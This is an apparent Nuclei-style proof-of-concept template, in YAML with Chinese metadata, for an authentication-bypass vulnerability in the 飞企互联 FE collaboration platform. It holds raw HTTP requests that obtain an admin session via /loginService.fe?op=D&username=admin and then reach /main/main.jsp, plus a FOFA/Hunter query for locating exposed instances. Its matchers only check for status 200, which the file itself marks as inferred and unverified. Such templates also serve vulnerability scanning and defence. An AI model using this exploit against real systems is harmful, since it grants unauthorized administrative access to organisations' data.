id: poc-7591843fa05a7e4f6486
info:
  name: 飞企互联FE业务协作平台存在身份认证绕过漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7591843fa05a7e4f6486f130ba56aad2

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: unauth,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 7591843fa05a7e4f6486f130ba56aad2
    fofa: + hunter`app.name=="飞企互联 FE 6.0+"`||`app.name=="飞企互联 FE"`
http:
- raw:
  - 'GET /loginService.fe?op=D&username=admin HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Connection: close

    Upgrade-Insecure-Requests: 1'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /main/main.jsp HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Connection: close

    Cookie: {cookie}

    Upgrade-Insecure-Requests: 1'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
